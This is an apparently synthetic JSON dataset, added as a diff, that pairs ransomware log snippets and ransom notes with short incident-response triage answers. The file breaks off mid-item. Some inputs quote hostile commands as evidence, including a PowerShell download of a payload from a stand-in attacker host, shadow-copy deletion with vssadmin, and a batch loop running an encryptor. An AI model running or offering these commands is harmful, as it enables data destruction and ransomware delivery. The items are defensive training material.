@@ -1,0 +1,1445 @@
+[
+  {
+    "Instruction": "Analyze the following server logs to detect if they indicate a ransomware infection.",
+    "Input": "System logs show mass file renaming to *.enc, with repeated 'vssadmin delete shadows' commands at 02:14 AM.",
+    "Output": "Likely a ransomware attack that removes shadow copies. Immediate isolation and restore from backups recommended.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "GenericRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review the ransom note found on compromised workstations.",
+    "Input": "\"All your files have been locked by LockMaster. Pay 1 BTC within 72 hours or lose data forever.\"",
+    "Output": "Ransom note from LockMaster. Urgent steps: isolate systems, analyze backups, evaluate if paying is necessary.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockMaster",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if the suspicious .exe flagged by antivirus is part of a RaaS affiliate payload.",
+    "Input": "Filename: 'accounting_update.exe' with known Trojan signature. Behavior: encrypts .doc, .xls, .pdf upon execution.",
+    "Output": "Malicious RaaS loader, possibly from SiloEncrypt affiliate. Quarantine file and check network segments for lateral spread.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SiloEncrypt",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Analyze the partial encryption logs showing random file extensions like .x13p after the intrusion.",
+    "Input": "Users report .x13p appended to critical files. Ransom note demands 5 BTC or threatens data leak on 'DarkBoard.'",
+    "Output": "Ransomware with double extortion threat. Family uncertain, but data leak tactic is typical of RaaS groups.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Unknown RaaS",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if the malicious macros found in a Word doc are part of a known RaaS initial infection.",
+    "Input": "Doc with auto-execute macro connected to hxxp://malserver.ru/payload. Then files renamed .cryptr.",
+    "Output": "Likely a RaaS campaign using doc macros as initial access. Immediate macro blocking and quarantining recommended.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MacroCryptr",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Determine if the random web shell found in /temp was used to deploy a RaaS binary.",
+    "Input": "Web logs show cmd: 'powershell -c iwr attacker-site/ransom.exe -outfile C:\\r.exe' then mass encryption events.",
+    "Output": "Web shell leveraged to drop RaaS binary. Full compromise of web server and subsequent encryption. Lock down environment.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "WebShellRaaS",
+      "platform": "Windows Server",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Evaluate the spam email attachments that triggered mass endpoint infections with known RaaS group TTPs.",
+    "Input": "Incoming attachments: 'Invoice_2025.scr', pivot to mass .locked file creation. Ransom note: 'Pay 2 BTC in 48 hrs.'",
+    "Output": "Mass RaaS outbreak from malicious spam. High severity, block attachments at gateway, begin IR processes.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "InvoiceLocker",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Check if partial encryption of a Linux server with files renamed .enc666 indicates a RaaS variant.",
+    "Input": "SSH logs show brute force, then 'chmod +x enc.sh' script that runs AES encryption on user directories.",
+    "Output": "Ransomware on Linux environment, likely from RaaS operation. Immediately isolate server, restore from offline backups.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Enc666",
+      "platform": "Linux",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze the posted sample of stolen HR data by a RaaS group as leverage for double extortion.",
+    "Input": "Threat actor 'DarkCrew' claims to have exfiltrated HR DB, demands 100k in BTC or threatens public leak.",
+    "Output": "Double extortion scenario. Confirm data exposure, evaluate negotiation or restore from backups, alert authorities.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DarkCrew",
+      "platform": "Windows, HR Database",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Determine if the 'ReadMeWarning.txt' discovered on user desktops is a LockBit RaaS affiliate ransom note.",
+    "Input": "File content: 'Your network is locked by LockBit. Contact [Tor site], pay 3 BTC or data leaks happen.'",
+    "Output": "Confirmed LockBit ransom note. Implement IR steps, consider TTP detection for LockBit affiliates on environment.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockBit",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess if the compromised RDP account was used to run 'ransom_run.bat' typical of a RaaS dropper.",
+    "Input": "RDP logs: user 'tempadmin' logs in, executes ransom_run.bat, triggers .encrypted extension on main shares.",
+    "Output": "RaaS infiltration via stolen RDP. Immediate credential resets, network segmentation, and incident response needed.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RDP-based RaaS",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Review the discovered PowerShell script 'Set-BitPay.ps1' that spawns encryption on the domain, typical of RaaS.",
+    "Input": "Script enumerates domain shares, then calls AES_Encrypt() function on each file. Ransom note references 'BitPay group.'",
+    "Output": "Malicious RaaS script. Domain-wide infiltration likely. Quarantine domain controllers and investigate further pivot paths.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BitPay RaaS",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if the 'VanityCrypt' binary found in Startup folder is a RaaS affiliate tool for persistent encryption.",
+    "Input": "\"VanityCrypt.exe\" auto-runs on reboot, each time scanning for new files. Ransom demand: 3000 USD in Bitcoin.",
+    "Output": "Persistent RaaS threat. Remove from Startup, investigate for lateral movement. Use offline backups for restoration.",
+    "Sentiment": "Negative",
+    "Score": 0.87,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "VanityCrypt",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Analyze the logs of a domain controller that see repeated group policy changes, culminating in encryption. Indicate RaaS involvement?",
+    "Input": "Attacker changed GPO to deploy 'lock_agent.msi' to all endpoints. Endpoints locked with .gx extension soon after.",
+    "Output": "Likely RaaS campaign controlling GPO for mass deployment. High-impact compromise requiring domain-level remediation.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "GroupPolicyRansom",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Determine if the 'help_your_files.html' in each folder signals a RaaS double extortion scheme.",
+    "Input": "\"Your files are locked by RedKey. We also copied your data. Pay 2 BTC or we leak it online.\"",
+    "Output": "Double extortion threat from RedKey RaaS. Incident response must address encryption and possible data breach.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RedKey",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess the partial encryption on a Mac environment caused by a known RaaS variant called MacLock.",
+    "Input": "User sees .mlock extension on critical docs. Ransom note: 'MacLock demands 1 BTC for unlock key.'",
+    "Output": "RaaS targeting macOS. Rare but confirmed MacLock. Quarantine system, look for backups or feasible decryptors.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MacLock",
+      "platform": "macOS",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze if the 'BlackDagger' strain discovered via EDR is a RaaS-affiliated group performing advanced lateral movement.",
+    "Input": "Detection: 'BlackDagger.exe' used Mimikatz to grab domain admin, then mass-encrypted share drives. Demands 50k USD.",
+    "Output": "RaaS group using privilege escalation for large-scale encryption. High severity, domain compromise suspected.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BlackDagger",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if the malicious 'SQLencrypt.dll' injected into MSSQL is part of a RaaS technique for DB ransoming.",
+    "Input": "MSSQL logs show custom DLL load, then all tables forcibly encrypted. Ransom note in DB: 'Pay 3 BTC or we drop data.'",
+    "Output": "RaaS plugin targeting SQL DB. Root out malicious DLL, restore from DB backups, and investigate lateral entry points.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SQLencrypt",
+      "platform": "Windows Server",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review the extortion email referencing the 'NoMoreRansom' decryptor's futility, from a RaaS brand known as 'IronWare.'",
+    "Input": "\"IronWare overcame your antivirus. NoMoreRansom won't help you. Pay 1.5 BTC if you want your data back.\"",
+    "Output": "IronWare ransom note discrediting public decryptors. Typical RaaS intimidation tactic. Evaluate IR approach carefully.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "IronWare",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'VaultBreaker' found on a small Linux-based file server is part of a RaaS affiliate campaign.",
+    "Input": "System shows cron job: 'vault_breaker.sh' running every hour, encrypting new files. Ransom demand in 'READ_TO_DECRYPT.txt.'",
+    "Output": "VaultBreaker RaaS on Linux. Remove cron job, isolate server, apply backups. Possibly advanced affiliate approach.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "VaultBreaker",
+      "platform": "Linux",
+      "kill_chain_phase": "Persistence"
+    }
+  },
+  {
+    "Instruction": "Check if the 'DarkBreach' affiliate uses email exfil logs indicating data theft prior to encryption.",
+    "Input": "Mail server logs: large attachments to attacker domain right before hosts show .dark extension on files.",
+    "Output": "RaaS double extortion from DarkBreach. Data exfil + encryption. Must address data breach risk & encryption.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DarkBreach",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Analyze the leftover 'RESTORE_FILES.html' that mentions 'PayloadSt0rm' RaaS group demands 2.5 BTC.",
+    "Input": "\"PayloadSt0rm locked your enterprise. Pay 2.5 BTC or all data will be publicly listed on our leaks site.\"",
+    "Output": "RaaS group known for leak site extortion. Prepare for possible data breach disclosures if not resolved.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "PayloadSt0rm",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if the newly discovered 'ZetaLock.exe' in Admin$ share is a RaaS affiliate tool for mass domain encryption.",
+    "Input": "ZetaLock spawns multiple threads. Domain sysvol directories renamed with .zeta. Demands 4 BTC.",
+    "Output": "Mass domain-wide RaaS infiltration. ZetaLock affiliate known for speed. Rapid domain isolation needed.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ZetaLock",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Review a random HPC cluster meltdown from 'ComputeLock' RaaS group who target research servers.",
+    "Input": "Job scheduler logs show unauthorized script 'cl_lock.sh' executed, all HPC files now .cl extension, demanding 10 BTC.",
+    "Output": "RaaS specifically attacking HPC environment. HPC data possibly large volumes. Disconnect cluster, attempt offline restore.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ComputeLock",
+      "platform": "Linux HPC",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze suspicious SFX archive 'hr_update.sfx' distributing RaaS payload to all HR machines.",
+    "Input": "Once extracted, .hrlock extension found on HR docs. Note: 'Pay 1 BTC to HR-Locker wallet in 72 hours.'",
+    "Output": "RaaS infiltration disguised as HR update. High severity, immediate machine isolation, contact IR teams.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "HRLocker",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Determine if the partial encryption on your container environment is from 'DockRansom' RaaS group.",
+    "Input": "Docker logs: malicious container pulling 'dock_ransom.tar', container then runs encryption on mounted volumes.",
+    "Output": "Container-based RaaS attack. DockRansom known for pivoting from inside container to host volumes. Immediate host isolation.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DockRansom",
+      "platform": "Docker/Linux",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Assess the scenario where a domain admin account was used to push 'MassEncrypt.ps1' across GPO. Suspect RaaS affiliate?",
+    "Input": "Logs show domain admin forcibly running powershell script on all endpoints, each now locked with .crypt extension.",
+    "Output": "RaaS wave using GPO. Full domain compromise. Invalidate domain admin accounts, remove malicious GPO, start IR steps.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MassEncrypt",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if 'Xtor Ransom' infected a small business via phishing, leading to repeated .xtor extension on all shared data.",
+    "Input": "Staff clicked malicious link, ended with Xtor Ransom note: 'Pay $5,000 or we publish your financials.'",
+    "Output": "Yes, Xtor RaaS campaign. SME environment compromised. Immediate steps: backups, forensic analysis, possible negotiation.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Xtor Ransom",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Analyze the leftover script that enumerates 'C:\\Users\\' and triggers encryption with a 'DarkShadow' note.",
+    "Input": "Script lines: 'for /d %%i in (C:\\Users\\*) do DarkShadow.exe /encrypt %%i.' Ransom: 2 BTC demanded.",
+    "Output": "DarkShadow RaaS script. Attack enumerates user profiles. Urgent IR needed to prevent further encryption spread.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "DarkShadow",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Decide if a brand new .evil extension across engineering CAD files signals the 'EvilCad' RaaS variant.",
+    "Input": "Engineering station sees .evil appended to .dwg, .cad. Ransom note references EvilCad: 'Pay 3.5 BTC or designs leaked.'",
+    "Output": "EvilCad RaaS specifically targeting design files. Possibly IP theft or double extortion scenario. Lock down engineering shares.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EvilCad",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Evaluate the 'NoKill' ransomware note stating backups are wiped and data exfiltrated.",
+    "Input": "\"NoKill has your data. We removed backups. Pay 2 BTC or we release it to the public.\"",
+    "Output": "Classic RaaS double extortion. Backups possibly destroyed. Must confirm offline backups or face major data loss.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NoKill",
+      "platform": "Windows",
+      "kill_chain_phase": "Inhibit System Recovery"
+    }
+  },
+  {
+    "Instruction": "Check if suspicious base64-encoded script in 'Startup' referencing 'CryptoMob' is a RaaS affiliate infection vector.",
+    "Input": "Startup folder file decodes to 'CryptoMob.exe', then immediate file encryption to .mob. Ransom: $20k in BTC.",
+    "Output": "Yes, CryptoMob RaaS infection. Remove from Startup, block execution, and attempt offline restore. Investigate persistence methods.",
+    "Sentiment": "Negative",
+    "Score": 0.89,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CryptoMob",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Analyze the incident where a known RaaS group 'OmegaEncrypt' claims they exfiltrated 200GB from finance servers before locking them.",
+    "Input": "OmegaEncrypt note: 'We have finance DB. Pay 4 BTC or we release all PII. System files now .omega.'",
+    "Output": "Double extortion by OmegaEncrypt. Immediate steps: contact IR, check compliance for potential PII breach, evaluate negotiation.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "OmegaEncrypt",
+      "platform": "Windows Server",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Determine if 'MailRoom_Encrypt.dll' triggered by Outlook macro is a RaaS technique for inbound compromise.",
+    "Input": "Outlook runs macro on new email, DLL loaded in memory, .locked appended to user docs, ransom 1.5 BTC.",
+    "Output": "Macro-based RaaS infiltration. Close Outlook macros, remove malicious DLL, secure endpoints, reset credentials.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MailRoom",
+      "platform": "Windows",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Review if the 'RevilLite' strain found in a compromised MSP environment is a RaaS affiliate pivot for multiple clients.",
+    "Input": "MSP's remote admin used to deploy 'revil_lite.exe' across client networks. Each shows .rvl extension, demands 5 BTC each.",
+    "Output": "Supply chain RaaS scenario. Attackers compromised MSP to push RevilLite. Clients need immediate IR, patch remote admin tools.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RevilLite",
+      "platform": "Windows MSP",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Check if the note referencing 'We speak your language' is from a known RaaS group offering multiple languages in ransom notes.",
+    "Input": "Ransom note: 'Hello, Hola, Hallo. Pay in BTC or your data is gone. This is MultiLingualRansom Team.'",
+    "Output": "Yes, multi-language RaaS tactic. Group offers translations to broaden victim scope. Standard double extortion approach.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MultiLingualRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze the partial encryption on an ESXi hypervisor containing multiple VMs, typical of a RaaS approach to maximize damage.",
+    "Input": "ESXi logs: malicious script 'esxi_locker.py' ran, VMs show .esxlock extension. Ransom: 10 BTC.",
+    "Output": "RaaS focusing on ESXi for large-scale encryption. Must isolate hypervisor, attempt to restore from VM backups.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ESXi-Locker",
+      "platform": "VMware ESXi",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if the newly discovered sub-process 'update_cryptservice.exe' hooking into LSASS is a RaaS affiliate method for credential harvesting then encryption.",
+    "Input": "update_cryptservice.exe loaded, hooking LSASS, then eventually started mass file encryption. Ransom note left in C:\\Temp.",
+    "Output": "RaaS using advanced credential dumping approach. Contains both infiltration and encryption. High severity compromise.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CryptService",
+      "platform": "Windows",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Check if 'MegaLock' discovered on an SMB share belongs to a RaaS group that also exfiltrates large PST files for blackmail.",
+    "Input": "SMB share logs: 'megalock.exe' scanning Outlook PSTs, then encrypting them to .megal. Ransom: 2 BTC or leak.",
+    "Output": "MegaLock RaaS focusing on email data for extortion. Must isolate share, see if PST exfil, consider data breach notifications.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MegaLock",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Review the ransom note left on all domain PCs: 'SilentCrack demands 6 BTC or parted data leak daily.'",
+    "Input": "\"Hello from SilentCrack! Each day you delay, 10% of your data is leaked. Contact our Tor site now.\"",
+    "Output": "Extortion with partial daily leak. Typical RaaS pressure tactic. Time-based escalation. High urgency response needed.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "SilentCrack",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze the discovered RBC build 'locked_build.dll' which runs on boot for a RaaS affiliate focusing on persistent encryption sessions.",
+    "Input": "Locked_build.dll checks for new user files each reboot, forcibly encrypting them. Ransom: $3,000 in Monero.",
+    "Output": "Persistent RaaS approach. Must remove malicious DLL from system startup and root out any boot-level tasks.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "LockBuild",
+      "platform": "Windows",
+      "kill_chain_phase": "Persistence"
+    }
+  },
+  {
+    "Instruction": "Check if the chat logs from intranet show the attacker calling themselves a 'BlackTiger' affiliate for RaaS extortion.",
+    "Input": "They boasted about exfiltrating finance data, posted partial screenshots as proof. Key phrase: 'BlackTiger always collects payment.'",
+    "Output": "BlackTiger RaaS group bragging. Validate data theft, prepare for negotiations or data leak. IR & legal steps needed.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "BlackTiger",
+      "platform": "Windows/FinanceSystem",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Analyze if the suspicious 'msupdate.ps1' script is a RaaS infiltration dropping Avaddon-based encryption payloads.",
+    "Input": "msupdate.ps1 fetches avaddon_payload.bin from remote IP, then runs local encryption. Ransom note = 'Avaddon brand.'",
+    "Output": "Yes, Avaddon RaaS infiltration via malicious script. Immediate PowerShell block, IP block, system isolation required.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "Avaddon",
+      "platform": "Windows",
+      "kill_chain_phase": "Delivery"
+    }
+  },
+  {
+    "Instruction": "Determine if the new extension .revn indicates a 'RE_vNext' RaaS variant which uses advanced encryption ciphers.",
+    "Input": "All documents now end .revn. Ransom note mentions 'RE_vNext' with unique AES-256 + RSA-4096 layering.",
+    "Output": "Likely RE_vNext RaaS. Complex encryption layering means no free decryptor. Incident response must focus on backups.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RE_vNext",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Review the scenario where known 'CrypTrack' RaaS uses tor-based C2 to manage distributed encryption in the environment.",
+    "Input": "Agents installed on each endpoint connect to tor address, receiving encryption commands. Ransom demand: 4.5 BTC total.",
+    "Output": "CrypTrack RaaS with central tor-based control. Need network blockade, host isolation, see if partial decrypt is possible.",
+    "Sentiment": "Negative",
+    "Score": 0.91,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CrypTrack",
+      "platform": "Windows",
+      "kill_chain_phase": "Command & Control"
+    }
+  },
+  {
+    "Instruction": "Check if unauthorized changes to backup scripts indicated a RaaS group tampering with backups prior to encryption.",
+    "Input": "Backup.ps1 replaced with malicious version that deletes old snapshots, then triggers 'EncrPack.exe.' Ransom note present.",
+    "Output": "RaaS tactic to sabotage backups. Must restore from offline backups older than sabotage date, re-secure scripts.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EncrPack",
+      "platform": "Windows",
+      "kill_chain_phase": "Inhibit System Recovery"
+    }
+  },
+  {
+    "Instruction": "Analyze if 'XLock' found on the domain DFS shares is a RaaS infiltration encrypting large swaths of distributed files.",
+    "Input": "DFS logs show files across multiple nodes suddenly .xlock. Note: 'XLock demands 2 BTC per DFS node.'",
+    "Output": "XLock RaaS attacking distributed file system. Full environment risk, immediate node isolation, restore needed.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "XLock",
+      "platform": "Windows DFS",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'NexRansom' exfiltrated staff personal data before encrypting them with .nex extension, typical double extortion.",
+    "Input": "SIEM alerts: large data upload to attacker IP, then .nex files everywhere. Demand: '2 BTC or data leaks.'",
+    "Output": "Yes, NexRansom double extortion. Investigate stolen data, consider mandatory breach notifications, begin restore.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NexRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Exfiltration"
+    }
+  },
+  {
+    "Instruction": "Check if a new Winlogon patch loaded from 'rx-run.dll' is typical of a RaaS affiliate hooking system calls to keep encryption running.",
+    "Input": "rx-run.dll modifies Winlogon, ensuring encryption tasks spawn at user login. Ransom note = 'RyzeCrew.'",
+    "Output": "RaaS hooking Windows auth to maintain persistence. Possibly RyzeCrew affiliate. Remove malicious DLL, secure Winlogon.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "RyzeCrew",
+      "platform": "Windows",
+      "kill_chain_phase": "Persistence"
+    }
+  },
+  {
+    "Instruction": "Analyze if the partial domain compromise by 'CrimsonRansom' RaaS used a zero-day or standard creds. Noted extension: .crims.",
+    "Input": "Domain admin logs show possible pass-the-hash. .crims appended to nearly all files. Ransom: 3 BTC.",
+    "Output": "CrimsonRansom infiltration, likely standard pass-the-hash vs zero-day. Full AD compromise, re-secure environment thoroughly.",
+    "Sentiment": "Negative",
+    "Score": 0.93,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "CrimsonRansom",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Exploitation"
+    }
+  },
+  {
+    "Instruction": "Assess the discovered 'ExBit' ransomware builder that affiliates can use to customize demands for each victim.",
+    "Input": "Builder UI screenshot shows options for encryption method, ransom note text, affiliate ID. Deployed sample demands 2.5 BTC.",
+    "Output": "ExBit is a RaaS builder. Attackers craft unique payloads per victim. Symbol of widespread RaaS threat model.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "ExBit",
+      "platform": "Windows",
+      "kill_chain_phase": "Weaponization"
+    }
+  },
+  {
+    "Instruction": "Check if the new extension .ekno belongs to 'EknoRansom' RaaS, known for phone-based extortion follow-up.",
+    "Input": "Incident response found phone calls to executives after encryption. Note: 'Pay or we call your clients.' .ekno present.",
+    "Output": "Yes, EknoRansom. They also do phone-based harassment. Advise legal teams, check double extortion stance.",
+    "Sentiment": "Negative",
+    "Score": 0.9,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EknoRansom",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Analyze the post-infection screen reading 'MoonCrpT Ransomware: Payment = 1.2 BTC or cost doubles in 24h.'",
+    "Input": "Lock screen forcibly appears on user reboot, all files .moon. They threaten doubling ransom daily.",
+    "Output": "MoonCrpT RaaS using time escalation. Must restore offline or negotiate quickly if no backups. Evaluate IR strategy.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "MoonCrpT",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Determine if 'OneKeyRansom' was installed via a domain GPO referencing a single encryption key for all machines.",
+    "Input": "OneKeyRansom uses same .onekey extension. Single AES key used across entire domain. Ransom note: 4 BTC total.",
+    "Output": "Single-key domain encryption. Possibly easier to recover if key leaked, but still requires urgent IR.",
+    "Sentiment": "Negative",
+    "Score": 0.88,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "OneKeyRansom",
+      "platform": "Windows Domain",
+      "kill_chain_phase": "Installation"
+    }
+  },
+  {
+    "Instruction": "Review 'StormX' logs where ICS operator HMI was locked down, typical RaaS infiltration bridging IT to OT.",
+    "Input": "HMI screens replaced with 'StormX' ransom banner: 'Pay 5 BTC to unlock ICS controls now.'",
+    "Output": "RaaS bridging to ICS layer. Critical OT at risk. Must isolate ICS from corporate network, restore backups, big IR challenge.",
+    "Sentiment": "Negative",
+    "Score": 0.95,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "StormX",
+      "platform": "Windows ICS HMI",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  },
+  {
+    "Instruction": "Check if 'PhaseLock' discovered on HPC compute nodes is a RaaS approach to hamper academic research for ransom.",
